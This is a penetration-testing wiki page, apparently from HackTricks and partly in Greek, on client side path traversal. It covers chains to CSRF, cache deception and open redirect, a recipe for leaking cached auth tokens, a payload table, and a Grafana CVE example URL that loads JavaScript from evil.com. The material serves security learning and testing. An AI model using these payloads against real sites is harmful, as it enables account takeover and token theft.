# Client Side Path Traversal

{{#include ../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

A client side path traversal συμβαίνει όταν μπορείτε να **παραποιήσετε το path ενός URL** που πρόκειται να **σταλεί σε έναν χρήστη ώστε να το επισκεφτεί με νόμιμο τρόπο** ή που ο χρήστης με κάποιο τρόπο θα **αναγκαστεί να επισκεφτεί για παράδειγμα μέσω JS ή CSS**. CSPT είναι επίσης γνωστό ως **On-Site Request Forgery (OSRF)** γιατί σας επιτρέπει να αναγκάσετε τον browser του θύματος να κάνει αιτήσεις σε αυθαίρετα paths στο ίδιο origin με τα cookies, JWTs ή mTLS πιστοποιητικά τους.

Τυπικές πηγές (δεδομένα που ελέγχετε):

- Παράμετροι route που συνενώνονται σε `fetch()` ή μονοπάτια XHR (React Router, Next.js dynamic routes, Vue router params, Angular `ActivatedRoute`).
- Αποθηκευμένες τιμές (profile slugs, document IDs) που ενσωματώνονται σε paths μέσα σε background jobs, service workers, ή WebSocket URLs.
- UI gadgets (κουμπιά download/export, image galleries) που προσθέτουν user-controlled fragments ή file extensions σε API endpoints πριν αποσταλεί το request.

Τυπικά sinks (που καταλήγει το traversal):

- Frontend API wrappers που προσθέτουν μπροστά `/api/` ή `/proxy/` και επαναχρησιμοποιούν auth headers αυτόματα.
- `history.pushState` / `router.navigate` helpers που ανασυνθέτουν URLs αργότερα κατά τη διάρκεια της hydration.
- `<link>`/`<style>`/`@import` statements που παράγονται από CMS content ή feature-flag payloads.

### Συνήθη αποτελέσματα & αλυσίδες

- **CSPT ➜ CSRF/OSRF**: hijack authenticated `POST/PUT/DELETE` κλήσεις διαφεύγοντας από το προοριζόμενο resource path, και μετά επανεισέρχοντας σε ευαίσθητα endpoints (password reset, payment approval, access revocation). Συνδυάστε με το checklist του [CSRF](csrf-cross-site-request-forgery.md) για escalation.
- **CSPT ➜ cache deception / poisoning**: σερβίρετε attacker-controlled JSON από public CDN keys και το αναπαράγετε μη αυθεντικοποιημένα. Βλέπε [Cache Poisoning and Cache Deception](cache-deception/README.md).
- **CSPT ➜ Open Redirect ➜ XSS/SSRF**: το traversal καταλήγει σε ένα open redirect endpoint, το οποίο κατόπιν ανακατευθύνει σε attacker infrastructure που σερβίρει κακόβουλο JS ή SSRF payloads. Συνδυάστε με abuses του [Open Redirect](open-redirect.md).

### Παραδείγματα ευρημάτων

- Στο [**this writeup**](https://erasec.be/blog/client-side-path-manipulation/), ήταν δυνατό να ** αλλάξει το invite URL ** ώστε να καταλήξει ** στην ακύρωση μιας κάρτας **.
- Στο [**this writeup**](https://mr-medi.github.io/research/2022/11/04/practical-client-side-path-traversal-attacks.html), ήταν δυνατό να συνδυαστεί ένα **client side path traversal μέσω CSS** (ήταν δυνατό να αλλάξει το path από όπου φορτωνόταν ένα CSS resource) με ένα **open redirect** για να φορτωθεί το CSS resource από ένα **attacker controlled domain**.
- Στο [**this writeup**](https://blog.doyensec.com/2024/07/02/cspt2csrf.html), παρουσιάζεται μια τεχνική για το πώς να καταχραστείτε CSPT **για να πραγματοποιήσετε μια CSRF επίθεση**. Αυτό γίνεται με το **monitoring όλων των δεδομένων** που ένας attacker μπορεί να ελέγξει (URL path, parameters, fragment, data injected in the DB...) **και των sinks** όπου αυτά τα δεδομένα καταλήγουν (requests που εκτελούνται).
- Δείτε [**this browser extension**](https://addons.mozilla.org/en-US/firefox/addon/eval-villain/) για monitoring αυτού.
- Δοκιμάστε το [**CSPT playground**](https://github.com/doyensec/CSPTPlayground) για να πειραματιστείτε με την τεχνική.
- Δείτε αυτό το [**tutorial**](https://blog.doyensec.com/2024/12/03/cspt-with-eval-villain.html) για το πώς να χρησιμοποιήσετε την browser extension στο playground.

## CSPT-assisted web cache poisoning/deception

CSPT μπορεί να συνδεθεί με extension-based CDN caching για την εξαγωγή sensitive JSON leaked από authenticated API κλήσεις:

- Ένα frontend συνενώνει user-controlled input σε ένα API path και επισυνάπτει authentication headers σε fetch/XHR.
- Εισάγοντας dot-segments (../) μπορείτε να ανακατευθύνετε την authenticated αίτηση σε ένα διαφορετικό endpoint στο ίδιο origin.
- Αν εκείνο το endpoint (ή μια path παραλλαγή με ένα static-looking suffix όπως .css) cache-άρεται από το CDN χωρίς να διαφοροποιείται βάσει των auth headers, η authenticated απάντηση του θύματος μπορεί να αποθηκευτεί υπό ένα public cache key και να ανακτηθεί από οποιονδήποτε.

Σύντομη συνταγή:

1) Βρείτε SPA κώδικα που χτίζει API URLs από path parameters ενώ στέλνει auth headers.
2) Εντοπίστε ευαίσθητα endpoints και δοκιμάστε static suffixes (.css, .js, .jpg, .json) για να δείτε αν το CDN αλλάζει σε Cache-Control: public/max-age και X-Cache: Hit ενώ επιστρέφει JSON.
3) Δολώστε το θύμα σε ένα URL που εγχέει traversal στην SPA παράμετρο ώστε το authenticated fetch να χτυπήσει το cacheable path variant (για παράδειγμα, ../../../v1/token.css).
4) Διαβάστε πίσω το ίδιο URL ανώνυμα για να αποκτήσετε το cached secret (token → ATO).

Δείτε λεπτομέρειες και mitigations στη σελίδα Cache Deception: [Cache Poisoning and Cache Deception](cache-deception/README.md).

## Hunting workflow & tooling

### Passive discovery with intercepting proxies

- **Correlate sources/sinks automatically**: το [CSPT Burp extension](https://github.com/doyensec/CSPTBurpExtension) parses your proxy history, clusters parameters that are later reflected inside other requests’ paths, και μπορεί να επανεκδώσει proof-of-concept URLs με canary tokens για να επιβεβαιώσει exploitable traversals. Μετά τη φόρτωση του JAR, θέστε το `Source Scope` σε client parameters (π.χ., `id`, `slug`) και τα `Sink Methods` σε `GET, POST, DELETE` ώστε το extension να επισημάνει επικίνδυνα request builders. Μπορείτε να εξάγετε όλες τις ύποπτες πηγές με ένα ενσωματωμένο canary για να τα επικυρώσετε μαζικά.
- **Look for double-URL-decoding**: κατά το browsing με Burp ή ZAP, προσέξτε για patterns όπως `/api/%252e%252e/` που κανονικοποιούνται από το frontend πριν φτάσουν στο δίκτυο—αυτά συνήθως εμφανίζονται ως base64-encoded JSON bodies που αναφέρονται σε route state και είναι εύκολο να παραβλεφθούν χωρίς automated scanner.

### Instrumenting SPA sinks manually

Dropping a short snippet in DevTools helps surface hidden traversals while you interact with the UI:
```javascript
(() => {
const origFetch = window.fetch;
window.fetch = async function (input, init) {
if (typeof input === "string" && /\.\.\//.test(input)) {
console.log("[CSPT candidate]", input, init?.method || "GET");
debugger;
}
return origFetch.apply(this, arguments);
};
})();
```
- Add similar wrappers around `XMLHttpRequest.prototype.open`, `history.pushState`, and framework-specific routers (e.g., `next/router`). Watching for `init.credentials === "include"` quickly narrows down requests that carry session cookies.
- If the app stores routing hints in IndexedDB/localStorage, edit those entries with traversal payloads and reload—the mutated state is often reinjected into requests pre-hydration.

### Εργαστήριο & πρόβα payload

- Spin up the CSPT Playground via `docker compose up` and practice chaining traversal ➜ CSRF ➜ stored XSS flows without touching the target. Reproducing the target’s router structure locally makes it easier to craft shareable PoCs.
- Maintain a scratchpad of successful dot-segment variations (`..;/`, `%2e%2e/`, `%2e./%2e/`, UTF-8 homoglyphs) and suffix tricks (`.css`, `.json`, `;` matrix params) you observed during recon so you can replay them quickly when a new sink appears.

## Πρόσφατες μελέτες περίπτωσης (2025)

- **Grafana OSS CVE-2025-4123/6023 (v11.5.0+)** – Ένα traversal gadget μέσα στο `/public/plugins/` επέτρεψε σε επιτιθέμενους να smuggle `../../` στον plugin asset loader, να το chainάρουν με το open redirect του Grafana και να αναγκάσουν τα θύματα να φορτώσουν attacker-controlled plugin bundles. Όταν τα anonymous dashboards ήταν ενεργοποιημένα, ένα κατασκευασμένο URL όπως `https://grafana.example.com/public/plugins/../../../../..//evil.com/poc/module.js` είχε ως αποτέλεσμα ο browser να εκτελέσει remote JavaScript· αν ήταν εγκατεστημένο το Image Renderer plugin, το ίδιο primitive μπορούσε να γυρίσει σε SSRF αναδρομολογώντας rendering requests προς εσωτερικούς hosts. Δοκιμάζετε πάντα τα plugin asset paths, anonymous dashboards και renderer endpoints μαζί, γιατί ένα μόνο traversal συχνά προσφέρει τόσο XSS όσο και SSRF vectors.

## Συλλογή payloads

| Στόχος | Πρότυπο payload | Σημειώσεις |
| --- | --- | --- |
| Πρόσβαση σε sibling API στον ίδιο origin | `?doc=../../v1/admin/users` | Works when routers simply concatenate `/${doc}`. Add `.json` if CDN only caches static-looking assets. |
| Εξαναγκασμός SPA να ακολουθήσει open redirect | `?next=..%2f..%2f..%2flogin/callback/%3FreturnUrl=https://attacker.tld/x` | Συνδυάστε με trusted redirectors που υπάρχουν στο codebase του στόχου. Chain with [Open Redirect](open-redirect.md). |
| Κατάχρηση CDN που βασίζεται σε επέκταση αρχείου | `?file=../../v1/token.css` | Το CDN μπορεί να χειριστεί `.css` ως στατικό και να cacheάρει μυστικά που επιστρέφονται ως JSON. |
| CSRF μέσω αλλαγής verb | `?action=../../payments/approve/.json&_method=POST` | Κάποιοι routers δέχονται overrides `_method`; συνδυάστε με traversal για να ξαναστοχεύσετε destructive endpoints. |

## Αναφορές

- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Grafana CVE-2025-4123 Chained Path Traversal + Open Redirect Analysis](https://www.cve.news/cve-2025-4123/)
- [Doyensec CSPT Burp Extension](https://github.com/doyensec/CSPTBurpExtension)

{{#include ../banners/hacktricks-training.md}}
